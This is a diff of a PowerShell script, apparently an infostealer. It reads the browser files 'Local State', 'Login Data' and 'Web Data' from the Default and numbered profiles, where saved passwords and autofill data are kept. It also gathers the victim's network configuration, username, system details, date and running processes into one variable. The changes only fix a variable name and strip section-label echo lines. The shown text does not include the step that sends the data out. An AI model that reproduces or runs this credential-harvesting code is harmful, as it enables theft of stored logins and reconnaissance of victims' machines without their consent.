@@ -1,12 +1,9 @@
-var += Get-Content "Local State"
+$var += Get-Content "Local State"
 
 cd Default
 
-$var += echo  ------------------------------Login Data------------------------------------------
 
 $var += Get-Content "Login Data"
-
-$var += echo  ------------------------------Web Data------------------------------------------
 
 $var += Get-Content "Web Data"
 
@@ -118,23 +115,15 @@ $var += if (Test-Path -Path "Profile 10") {
 
 start-sleep 4
 
-$var += echo  ------------------------------IPCONFIG------------------------------------------
+
 
 $var += Get-NetIPConfiguration 
 
-$var += echo  ------------------------------WHOAMI------------------------------------------
-
 $var += whoami
-
-$var += echo  ------------------------------COMPUTERINFO------------------------------------------
 
 $var += Get-ComputerInfo
 
-$var += echo  ------------------------------DATE------------------------------------------
-
 $var += Get-Date
-
-$var += echo  ------------------------------PROCESSES------------------------------------------
 
 $var += ps 
 
